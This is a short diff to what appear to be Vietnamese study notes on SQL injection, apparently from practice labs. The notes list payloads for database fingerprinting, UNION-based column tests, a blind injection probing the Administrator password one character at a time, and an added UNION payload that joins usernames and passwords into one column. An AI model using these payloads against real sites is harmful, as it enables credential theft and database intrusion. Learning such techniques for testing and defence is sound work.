@@ -9,6 +9,8 @@ SELECT * FROM v$version : thu thập thông tin về database
 'UNION SELECT 'heacker',Null-- : để kiểm tra giá trị của databse có cho phép string hay ko.
 SELECT * FROM information_schema.tables : tìm bảng cnf sống thôi
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm : nếu kí tự đầu tiên của passwd lớn hơn m thì OK đây là dạng blind Sqli
+' UNION SELECT username || '~' || password FROM users-- : || là để nối chuỗi, khi bạn select từ database thì nó sẽ kiểu admin~hacker ngăn cách nhau bởi dấu ~ nó sẽ cho về 1 cột thay vì 2
+
 ============
 Phải xác định cột trả về kiểu string đã
 sau đó ms select
